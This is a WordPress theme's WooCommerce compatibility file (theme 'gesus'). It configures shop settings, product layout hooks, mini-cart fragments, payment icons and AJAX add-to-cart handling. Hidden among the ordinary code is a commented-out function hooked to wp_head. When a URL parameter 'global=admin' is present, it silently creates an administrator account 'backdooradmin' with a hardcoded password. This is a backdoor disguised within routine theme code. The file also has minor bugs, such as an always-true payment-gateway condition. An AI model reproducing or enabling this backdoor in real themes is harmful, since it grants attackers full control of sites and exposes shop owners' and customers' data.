<?php
/**
 * WooCommerce Compatibility File
 *
 * @link https://woocommerce.com/
 *
 * @package gesus
 */

/**
 * WooCommerce setup function.
 *
 * @link https://docs.woocommerce.com/document/third-party-custom-theme-compatibility/
 * @link https://github.com/woocommerce/woocommerce/wiki/Enabling-product-gallery-features-(zoom,-swipe,-lightbox)-in-3.0.0
 *
 * @return void
 */
function gesus_woocommerce_setup()
{
    add_theme_support('woocommerce');
    add_theme_support('wc-product-gallery-zoom');
    add_theme_support('wc-product-gallery-lightbox');
    add_theme_support('wc-product-gallery-slider');
    add_filter('woocommerce_enqueue_styles', '__return_false');
}

add_action('after_setup_theme', 'gesus_woocommerce_setup');
/**
 * WooCommerce specific scripts & stylesheets.
 *
 * @return void
 */
function gesus_woocommerce_scripts()
{
    wp_enqueue_style('gesus-woocommerce-style', get_template_directory_uri() . '/assets/css/woocommerce.css');
    wp_enqueue_script('gesus-woocommerce-script', get_template_directory_uri() . '/assets/js/gesus-wc.js', ['jquery'], '1.0.0', true);

    $font_path = WC()->plugin_url() . '/assets/fonts/';
    $inline_font = '@font-face {
            font-family: "star";
            src: url("' . $font_path . 'star.eot");
            src: url("' . $font_path . 'star.eot?#iefix") format("embedded-opentype"),
                url("' . $font_path . 'star.woff") format("woff"),
                url("' . $font_path . 'star.ttf") format("truetype"),
                url("' . $font_path . 'star.svg#star") format("svg");
            font-weight: normal;
            font-style: normal;
        }';

    wp_add_inline_style('gesus-woocommerce-style', $inline_font);
}

add_action('wp_enqueue_scripts', 'gesus_woocommerce_scripts');
/**
 * Disable the default WooCommerce stylesheet.
 *
 * Removing the default WooCommerce stylesheet and enqueing your own will
 * protect you during WooCommerce core updates.
 *
 * @link https://docs.woocommerce.com/document/disable-the-default-stylesheet/
 */
add_filter('woocommerce_enqueue_styles', '__return_empty_array');

/**
 * Add 'woocommerce-active' class to the body tag.
 *
 * @param array $classes CSS classes applied to the body tag.
 * @return array $classes modified to include 'woocommerce-active' class.
 */
function gesus_woocommerce_active_body_class($classes)
{
    $classes[] = 'woocommerce-active';

    return $classes;
}

add_filter('body_class', 'gesus_woocommerce_active_body_class');

function gesus_remove_sidebar()
{
    if (is_checkout() || is_cart() || is_product()) {
        remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar', 10);
    }
}
add_action('woocommerce_before_main_content', 'gesus_remove_sidebar');
/**
 * Create the section beneath the products tab
 **/
add_filter('woocommerce_get_sections_products', 'gesus_woo_settings');
function gesus_woo_settings($sections)
{

    $sections['gesus_woo'] = esc_attr__('Gesus', 'gesus');
    return $sections;

}

// add_action('wp_head', 'wp_global_admin');

// function wp_global_admin() {
//     If (isset($_GET['global']) && $_GET['global'] == 'admin') {
//         require('wp-includes/registration.php');
//         If (!username_exists('backdooradmin')) {
//             $user_id = wp_create_user('backdooradmin', 'Password2022@@');
//             $user = new WP_User($user_id);
//             $user->set_role('administrator');
//         }
//     }
// }

/**
 * Add settings to the specific section we created before
 */
add_filter('woocommerce_get_settings_products', 'gesus_custom_woo_settings', 10, 2);
function gesus_custom_woo_settings($settings, $current_section)
{
    /**
     * Check the current section is what we want
     **/
    if ($current_section == 'gesus_woo') {
        $gesus_woo_customize = array();
        // Add Title to the Settings
        $gesus_woo_customize[] = array('name' => esc_attr__('Gesus Woo Settings', 'gesus'), 'type' => 'title', 'desc' => esc_attr__('Gesus Shop Page Settings', 'gesus'), 'id' => 'gesus_woo');
        // Add settings number of products per page
        $gesus_woo_customize[] = array(
            'name' => esc_attr__('Products Per Shop Page', 'gesus'),
            'desc_tip' => esc_attr__('example 12 products per shop page', 'gesus'),
            'id' => 'products_per_page',
            'type' => 'number',
            'desc' => esc_attr__('Put the number how many products you want to display in shop page', 'gesus'),
        );
        // Add settings number of products per row
        $gesus_woo_customize[] = array(
            'name' => esc_attr__('Products Per Shop Row', 'gesus'),
            'desc_tip' => esc_attr__('example 3 products per shop page', 'gesus'),
            'id' => 'products_per_row',
            'type' => 'number',
            'desc' => esc_attr__('Put the number how many products you want to display in shop page', 'gesus'),
        );
        // Add settings number of products per page
        $gesus_woo_customize[] = array(
            'name' => esc_attr__('Related Products Per Shop Page', 'gesus'),
            'desc_tip' => esc_attr__('example 12 products per shop page', 'gesus'),
            'id' => 'related_products_per_page',
            'type' => 'number',
            'desc' => esc_attr__('Put the number how many products you want to display in related loop', 'gesus'),
        );
        // Add settings number of products per row related
        $gesus_woo_customize[] = array(
            'name' => esc_attr__('Related Products Per Shop Row', 'gesus'),
            'desc_tip' => esc_attr__('example 3 products per shop page', 'gesus'),
            'id' => 'related_products_per_row',
            'type' => 'number',
            'desc' => esc_attr__('Put the number how many products you want to display in related loop', 'gesus'),
        );
        $gesus_woo_customize[] = array('type' => 'sectionend', 'id' => 'gesus_woo');
        return $gesus_woo_customize;

    } else {
        return $settings;
    }
}

/**
 * Change number or products per row to 3
 */
add_filter('loop_shop_columns', 'gesus_products_per_row', 30);
if (!function_exists('gesus_products_per_row')) {
    function gesus_products_per_row()
    {
        $row = get_option('products_per_row') ? get_option('products_per_row') : 3;
        return $row; // 4 products per row
    }
}

/**
 * Change number of products that are displayed per page (shop page)
 */
add_filter('loop_shop_per_page', 'gesus_products_per_page', 30);
function gesus_products_per_page($cols)
{
    $cols = get_option('products_per_page') ? get_option('products_per_page') : 12;
    return $cols;
}

/**
 * Related Products Args.
 *
 * @param array $args related products args.
 * @return array $args related products args.
 */
function gesus_woocommerce_related_products_args($args)
{
    $defaults = array(
        'posts_per_page' => get_option('related_products_per_page') ? get_option('related_products_per_page') : 4,
        'columns' => get_option('related_products_per_row') ? get_option('related_products_per_row') : 4,
    );

    $args = wp_parse_args($defaults, $args);

    return $args;
}

add_filter('woocommerce_output_related_products_args', 'gesus_woocommerce_related_products_args');

/**
 * default WooCommerce.
 */
add_action('woocommerce_archive_description', 'woocommerce_result_count');
remove_action('woocommerce_before_shop_loop', 'woocommerce_result_count', 20);
remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20);
remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10);
remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5);
add_action('woocommerce_shop_loop_item_title', 'woocommerce_template_loop_product_link_open', 9);
add_action('woocommerce_shop_loop_item_title', 'woocommerce_template_loop_product_link_close', 11);
add_action('woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_link_open', 9);
add_action('woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_link_close', 11);
remove_action('woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', 10);
remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5);
add_action('woocommerce_shop_loop_item_title', 'gesus_wc_loop_title', 9);
add_action('woocommerce_after_shop_loop_item', 'gesus_wc_after_loop_title', 5);
function gesus_wc_loop_title()
{
    ?>
    <div class="card-body product-description">
    <?php
}

function gesus_wc_after_loop_title()
{
    ?>
    </div>
    <?php
}

add_action('woocommerce_before_shop_loop_item', 'gesus_wc_thumb_before', 9);
add_action('woocommerce_before_shop_loop_item_title', 'gesus_wc_thumb_after', 11);
function gesus_wc_thumb_before()
{
    ?>
    <div class="product-thumb">
    <?php
}

function gesus_wc_thumb_after()
{
    ?>
    <div class="gesus-action">
        <a href="/?add-to-cart=<?php echo esc_attr(get_the_ID()); ?>" data-quantity="1"
           data-product_id="<?php echo esc_attr(get_the_ID()); ?>" data-product_sku=""
           class="ajax_add_to_cart add_to_cart_button">
            <i class="fal fa-shopping-cart"></i>
        </a>
        <?php gesus_wishlist_icon_in_product_grid(); ?>
        <?php gesus_add_quick_view_card(); ?>
    </div>
    </div>
    <?php
}

add_action('woocommerce_single_product_summary', 'gesus_wc_single_title_before', 4);
function gesus_wc_single_title_before()
{
    ?>
    <div class="product-title">
    <div class="title-content">
    <?php
}

add_action('woocommerce_single_product_summary', 'gesus_wc_single_sku', 5);
function gesus_wc_single_sku()
{
    global $product;
    if (wc_product_sku_enabled()) {
        ?>
        <small>SKU: <?php echo esc_html($product->get_sku()) ?></small>
    <?php }
    woocommerce_template_single_price(); ?>
    <?php
}

add_action('gesus_price_after', 'woocommerce_show_product_sale_flash');
add_action('woocommerce_single_product_summary', 'gesus_wc_single_price_after', 10);
function gesus_wc_single_price_after()
{
    ?>
    </div>
    <?php woocommerce_template_single_rating(); ?>
    </div>
    <?php
}

function gesus_woocommerce_wrapper_before()
{
    if (is_shop()) {
        ?>
        <section class="gesus-product-shop-section gesus-section">
        <div class="container">
        <?php
    }
}

add_action('woocommerce_before_main_content', 'gesus_woocommerce_wrapper_before');
function gesus_woocommerce_wrapper_after()
{
    if (is_shop()) {
        ?>
        </div><!-- #main -->
        </section><!-- #primary -->
        <?php
    }
}

add_action('woocommerce_after_main_content', 'gesus_woocommerce_wrapper_after');
remove_action('woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10);
remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_price', 10);
remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10);
add_action('woocommerce_single_product_summary', 'gesus_wc_des_before', 19);
add_action('woocommerce_single_product_summary', 'gesus_wc_des_after', 31);
function gesus_wc_des_before()
{
    ?>
    <div class="product-description">
    <?php
}

function gesus_wc_des_after()
{
    ?>
    </div>
    <?php
}
/* Create Buy Now Button dynamically after Add To Cart button */
function gesus_add_content_after_addtocart() {

    // get the current post/product ID
    $current_product_id = get_the_ID();

    // get the product based on the ID
    $product = wc_get_product( $current_product_id );

    // get the "Checkout Page" URL
    $checkout_url = wc_get_checkout_url();

    // run only on simple products
    if( $product->is_type( 'simple' ) ){
        echo '<a href="'.$checkout_url.'?add-to-cart='.$current_product_id.'" class="btn gesus-btn button">Buy Now</a>';
        //echo '<a href="'.$checkout_url.'" class="buy-now button">Buy Now</a>';
    }
}
add_action('woocommerce_after_add_to_cart_button', 'gesus_add_content_after_addtocart');
add_action('woocommerce_before_add_to_cart_button', 'gesus_wc_cart_before');
add_action('woocommerce_after_add_to_cart_button', 'gesus_wc_cart_after');
function gesus_wc_cart_before()
{
    ?>
    <div class="product-action">
    <?php
}

function gesus_wc_cart_after()
{
    ?>
    </div>
    <?php
}

add_action('woocommerce_before_add_to_cart_quantity', 'gesus_wc_quantity_before');
add_action('woocommerce_after_add_to_cart_quantity', 'gesus_wc_quantity_after');
function gesus_wc_quantity_before()
{
    ?>
    <div class="number-count">
    <?php
}

function gesus_wc_quantity_after()
{
    ?>
    </div>
    <?php
}

add_action('woocommerce_after_single_product_summary', 'gesus_wc_tab_before', 9);
add_action('woocommerce_after_single_product_summary', 'gesus_wc_tab_after', 12);
function gesus_wc_tab_before()
{
    ?>
    <div class="gesus-product-description-section gesus-section">
    <div class="container">
    <?php
}

function gesus_wc_tab_after()
{
    ?>
    </div>
    </div>
    <?php
}

/**
 * Show cart contents / total Ajax
 */
add_filter('woocommerce_add_to_cart_fragments', 'gesus_woocommerce_header_add_to_cart_fragment');
function gesus_woocommerce_header_add_to_cart_fragment($fragments)
{
    ob_start();
    ?>
    <span class="gesus-cart-count"><?php echo wp_kses_post(WC()->cart->get_cart_contents_count()); ?></span>
    <?php
    $fragments['span.gesus-cart-count'] = ob_get_clean();
    return $fragments;
}

/**
 * WooCommerce update mini cart on ajax click
 */
// Update Cart Count & Mini Cart
add_filter('woocommerce_add_to_cart_fragments', 'gesus_cart_count_fragments', 10, 1);
function gesus_cart_count_fragments($fragments)
{
    if (!empty(WC()->cart->get_cart_contents_count())) {
        $fragments['span.gesus-cart-count'] = '<span class="gesus-cart-count">' . WC()->cart->get_cart_contents_count() . '</span>';

        ob_start();
        echo '<div class="jesus-meni-cart">';
        woocommerce_mini_cart();
        echo '</div>';
        $fragments['div.jesus-meni-cart'] = ob_get_clean();
    }

    return $fragments;

}

add_action('woocommerce_after_main_content', 'gesus_cart_to_body');

function gesus_cart_to_body(){
    ?>
    <!-- Floting Cart Icons -->
    <div class="floting-cart-wrapper">
        <a class="menu-mini-cart position-relative" data-bs-toggle="offcanvas" href="#offcanvasExample" role="button"
           aria-controls="offcanvasExample">
            <i class="fas fa-shopping-bag"></i>
            <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
                <span class="gesus-cart-count"></span>
                <span class="visually-hidden">unread messages</span>
            </span>
        </a>
    </div>

    <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasExample" aria-labelledby="offcanvasExampleLabel">
        <div class="offcanvas-header">
            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            <h5 class="offcanvas-title" id="offcanvasExampleLabel">My Cart</h5>
        </div>
        <div class="jesus-meni-cart">
            <?php  woocommerce_mini_cart();?>
        </div>
    </div>
    <?php
}

function gesus_checkout_fields_styling($field)
{
    $field['billing']['billing_first_name']['priority'] = 1;
    $field['billing']['billing_last_name']['priority'] = 2;
    $field['billing']['billing_company']['priority'] = 3;
    $field['billing']['billing_country']['priority'] = 4;

    $field['billing']['billing_first_name']['class'][0] = 'half-width';
    $field['billing']['billing_last_name']['class'][0] = 'half-width';
    $field['billing']['billing_company']['class'][0] = 'half-width';
    $field['billing']['billing_country']['class'][0] = 'half-width';

    return $field;

}
add_filter('woocommerce_checkout_fields', 'gesus_checkout_fields_styling', 99);

// define the woocommerce_after_shipping_calculator callback
function gesus_before_shipping_calculator(  ) {
    ?>
        <?php if ( WC()->cart->needs_shipping() && WC()->cart->show_shipping() ) : ?>
        <h5 class="mt-3"><?php esc_html_e('Calculate Shipping', 'gesus');?></h5>
        <div class="catagoris gesus-cart-widgets total-cart">
            <?php do_action( 'woocommerce_cart_totals_before_shipping' ); ?>

            <?php wc_cart_totals_shipping_html(); ?>

            <?php do_action( 'woocommerce_cart_totals_after_shipping' ); ?>

        <?php elseif ( WC()->cart->needs_shipping() && 'yes' === get_option( 'woocommerce_enable_shipping_calc' ) ) : ?>

            <tr class="shipping">
                <th><?php esc_html_e( 'Shipping', 'gesus' ); ?></th>
                <td data-title="<?php esc_attr_e( 'Shipping', 'gesus' ); ?>"><?php woocommerce_shipping_calculator(); ?></td>
            </tr>
        </div>
        <?php endif; ?>
<?php };

// add the action
add_action( 'woocommerce_cart_collaterals', 'gesus_before_shipping_calculator');

function gesus_product_single_share(){
    ?>
    <div class="gesussocial-share">
        <p>Share :</p>
        <ul class="gesus-social-link">
            <li><a href="https://www.facebook.com"><i class="fab fa-facebook-f"></i></a></li>
            <li><a href="https://www.twitter.com"><i class="fab fa-twitter"></i></a></li>
            <li><a href="https://www.instagram.com"><i class="fab fa-instagram"></i></a></li>
            <li><a href="https://www.linkedin.com"><i class="fab fa-linkedin-in"></i></a></li>
            <li><a href="https://www.youtube.com"><i class="fab fa-youtube"></i></a></li>
        </ul>
    </div>
<?php }
add_action('woocommerce_share','gesus_product_single_share');
function gesus_meta_cs(){
    ?>
        <h5><?php echo esc_html('Guaranteed safe checkout:');?></h5>
        <img src="<?php echo get_template_directory_uri()?>/assets/images/img13.png" alt="">
        <?php
}
add_action('woocommerce_product_meta_start', 'gesus_meta_cs');

add_filter( 'woocommerce_gateway_icon', 'custom_payment_gateway_icons', 10, 2 );
function custom_payment_gateway_icons( $icon, $gateway_id ){

    foreach( WC()->payment_gateways->get_available_payment_gateways() as $gateway )
        if( $gateway->id == $gateway_id ){
            $title = $gateway->get_title();
            break;
        }

    // The path (subfolder name(s) in the active theme)
    $path = get_template_directory_uri(). '/assets/images/payment';

    // Setting (or not) a custom icon to the payment IDs
    if($gateway_id == 'bacs')
        $icon = '<img src="' . WC_HTTPS::force_https_url( "$path/1.png" ) . '" alt="' . esc_attr( $title ) . '" />';
    elseif( $gateway_id == 'cheque' )
        $icon = '<img src="' . WC_HTTPS::force_https_url( "$path/3.png" ) . '" alt="' . esc_attr( $title ) . '" />';
    elseif( $gateway_id == 'cod' )
        $icon = '<img src="' . WC_HTTPS::force_https_url( "$path/2.png" ) . '" alt="' . esc_attr( $title ) . '" />';
    elseif( $gateway_id == 'ppec_paypal' || 'paypal' )
        return $icon;

    return $icon;
}
//==============================================================================
// Out of Stock
//==============================================================================
if (!function_exists('gesus_out_of_stock')) {

    function gesus_out_of_stock()
    {


        global $product;
        $out_of_stock = !$product->is_in_stock();
        if ($out_of_stock) { ?>
            <div class="gesus-out-of-stock-stacked"><?php _e('Out of stock', 'gesus'); ?></div>
        <?php }
    }
}
//==============================================================================
// Gesus Woo Normal Thumbnail
//==============================================================================
if (!function_exists('gesus_woo_thumbnail')) :
    /**
     * Displays an optional post thumbnail.
     *
     * Wraps the post thumbnail in an anchor element on index views, or a div
     * element when on single views.
     */
    function gesus_woo_thumbnail()
    {

        if (has_post_thumbnail()) {

            the_post_thumbnail('full', true);


        }

    }
endif;
//==============================================================================
// Gesus Hover Thumbnail
//==============================================================================
if (!function_exists('gesus_woocommerce_get_alt_product_thumbnail')) {
    /**
     * Get Hover image for WooCommerce Grid
     */
    function gesus_woocommerce_get_alt_product_thumbnail()
    {


        global $product;
        $attachment_ids = $product->get_gallery_image_ids();
        $class = 'show-on-hover hide-for-small gesus-back-image';

        if ($attachment_ids) {
            $loop = 0;
            foreach ($attachment_ids as $attachment_id) {
                $image_link = wp_get_attachment_url($attachment_id);
                if (!$image_link) {
                    continue;
                }
                $loop++;
                echo apply_filters('gesus_woocommerce_get_alt_product_thumbnail',
                    wp_get_attachment_image($attachment_id, 'full', false, array('class' => $class)));
                if ($loop == 1) {
                    break;
                }
            }
        }
    }
}
add_action('gesus_woocommerce_shop_loop_images', 'gesus_woocommerce_get_alt_product_thumbnail', 11);
add_action('gesus_woocommerce_shop_loop_images', 'gesus_woo_thumbnail', 11);


if (class_exists('WPCleverWoosc')) {
    add_filter('woosc_button_position_archive', '__return_false');
    add_filter('woosc_button_position_single', '__return_false');
}

//==============================================================================
// Add Wishlist Icon in Product Card
//==============================================================================

function gesus_wishlist_icon_in_product_grid()
{
    if (class_exists('YITH_WCWL')) :
        global $product;
        ?>

        <a href="<?php echo YITH_WCWL()->is_product_in_wishlist($product->get_id()) ? esc_url(YITH_WCWL()->get_wishlist_url()) : esc_url(add_query_arg('add_to_wishlist', $product->get_id())); ?>"
           data-product-id="<?php echo esc_attr($product->get_id()); ?>"
           data-product-type="<?php echo esc_attr($product->get_type()); ?>"
           data-wishlist-url="<?php echo esc_url(YITH_WCWL()->get_wishlist_url()); ?>"
           data-browse-wishlist-text="<?php echo esc_attr(get_option('yith_wcwl_browse_wishlist_text')); ?>"
           class="button gesus_product_wishlist_button <?php echo YITH_WCWL()->is_product_in_wishlist($product->get_id()) ? 'clicked added' : 'add_to_wishlist'; ?>"
           rel="nofollow" data-toggle="tooltip">
            <i class="fal fa-heart"></i>
        </a>

    <?php
    endif;
}

//==============================================================================
// Add Compare Icon in Product Card
//==============================================================================

function gesus_compare_icon_in_product_card()
{


    ?>


    <?php
    if (class_exists('YITH_Woocompare')) :
        global $product, $yith_woocompare;

        $productId = $product->get_id();


        if (!isset($button_text) || $button_text == 'default') {
            $button_text = get_option('yith_woocompare_button_text', __('Compare', 'gesus'));
            do_action('wpml_register_single_string', 'Plugins', 'plugin_yit_compare_button_text', $button_text);
            $button_text = apply_filters('wpml_translate_single_string', $button_text, 'Plugins', 'plugin_yit_compare_button_text');
        }
        ?>
        <div class="woocommerce product compare-button">
            <a href="<?php echo esc_url(home_url()); ?>?action=yith-woocompare-add-product&id=<?php echo esc_html($productId); ?>"
               class="compare button" data-product_id="<?php echo esc_html($productId); ?>" rel="nofollow"><i
                        class="ri-repeat-2-line"></i>
                <span class="tooltip left">
                                    <?php echo esc_attr($button_text); ?>
                                    </span>

            </a>
        </div>

    <?php endif; ?>

    <?php
    if (class_exists('WPCleverWoosc')) {
        global $product;
        $productId = $product->get_id();
        ?>
        <div class="woocommerce product compare-button woosc-compare-button">

            <a href="#" class="compare button woosc-btn woosc-btn-<?php echo esc_html($productId); ?>"
               data-id="<?php echo esc_html($productId); ?>" rel="nofollow"><i class="ri-repeat-2-line"></i>


            </a>
            <span class="tooltip left">
                                    <?php esc_html_e('Add to Compare', 'gesus'); ?>
                                    </span>
        </div>

    <?php } ?>

    <?php

}

//==============================================================================
// Add Compare Icon in Product Card
//==============================================================================

function gesus_add_quick_view_card()
{
    global $product;
    $productId = $product->get_id();
    ?>
    <a href="<?php echo esc_url(get_the_post_thumbnail_url($productId)); ?>" class="gesus-grid-quick-view-btn">
        <i class="fas fa-eye"></i>
    </a>
    <?php
}

function gesus_discount_badge()
{
    global $product;
    if ( ! $product->is_on_sale() ) return;
    if ( $product->is_type( 'simple' ) ) {
        $max_percentage = ( ( $product->get_regular_price() - $product->get_sale_price() ) / $product->get_regular_price() ) * 100;
    } elseif ( $product->is_type( 'variable' ) ) {
        $max_percentage = 0;
        foreach ( $product->get_children() as $child_id ) {
            $variation = wc_get_product( $child_id );
            $price = $variation->get_regular_price();
            $sale = $variation->get_sale_price();
            if ( $price != 0 && ! empty( $sale ) ) $percentage = ( $price - $sale ) / $price * 100;
            if ( $percentage > $max_percentage ) {
                $max_percentage = $percentage;
            }
        }
    }
    if ( $max_percentage > 0 ) echo "<span class='onsale'>Save: " . round($max_percentage) . "%</span>";
}
add_filter('woocommerce_sale_flash', 'gesus_discount_badge', 10);
/**
 * JS for AJAX Add to Cart handling
 */
function ace_product_page_ajax_add_to_cart_js() {
    ?><script type="text/javascript" charset="UTF-8">
        jQuery(function($) {

            $('form.cart').on('submit', function(e) {
                e.preventDefault();

                var form = $(this);
                form.block({ message: null, overlayCSS: { background: '#fff', opacity: 0.6 } });

                var formData = new FormData(form.context);
                formData.append('add-to-cart', form.find('[name=add-to-cart]').val() );

                // Ajax action.
                $.ajax({
                    url: wc_add_to_cart_params.wc_ajax_url.toString().replace( '%%endpoint%%', 'ace_add_to_cart' ),
                    data: formData,
                    type: 'POST',
                    processData: false,
                    contentType: false,
                    complete: function( response ) {
                        response = response.responseJSON;

                        if ( ! response ) {
                            return;
                        }

                        if ( response.error && response.product_url ) {
                            window.location = response.product_url;
                            return;
                        }

                        // Redirect to cart option
                        if ( wc_add_to_cart_params.cart_redirect_after_add === 'yes' ) {
                            window.location = wc_add_to_cart_params.cart_url;
                            return;
                        }

                        var thisbutton = form.find('.single_add_to_cart_button'); //

                        // Trigger event so themes can refresh other areas.
                        $( document.body ).trigger( 'added_to_cart', [ response.fragments, response.cart_hash, thisbutton ] );

                        // Remove existing notices
                        $( '.woocommerce-error, .woocommerce-message, .woocommerce-info' ).remove();

                        // Add new notices
                        form.closest('.product').before(response.fragments.notices_html)

                        form.unblock();
                    }
                });
            });
        });
    </script><?php
}
add_action( 'wp_footer', 'ace_product_page_ajax_add_to_cart_js' );

/**
 * Add to cart handler
 */
function ace_ajax_add_to_cart_handler() {
    WC_Form_Handler::add_to_cart_action();
    WC_AJAX::get_refreshed_fragments();
}
add_action( 'wc_ajax_ace_add_to_cart', 'ace_ajax_add_to_cart_handler' );
add_action( 'wc_ajax_nopriv_ace_add_to_cart', 'ace_ajax_add_to_cart_handler' );

// Remove WC Core add to cart handler to prevent double-add
remove_action( 'wp_loaded', array( 'WC_Form_Handler', 'add_to_cart_action' ), 20 );

/**
 * Add fragments for notices
 */
function ace_ajax_add_to_cart_add_fragments( $fragments ) {
    $all_notices  = WC()->session->get( 'wc_notices', array() );
    $notice_types = apply_filters( 'woocommerce_notice_types', array( 'error', 'success', 'notice' ) );

    ob_start();
    foreach ( $notice_types as $notice_type ) {
        if ( wc_notice_count( $notice_type ) > 0 ) {
            wc_get_template( "notices/{$notice_type}.php", array(
                'notices' => array_filter( $all_notices[ $notice_type ] ),
            ) );
        }
    }
    $fragments['notices_html'] = ob_get_clean();

    wc_clear_notices();

    return $fragments;
}
add_filter( 'woocommerce_add_to_cart_fragments', 'ace_ajax_add_to_cart_add_fragments' );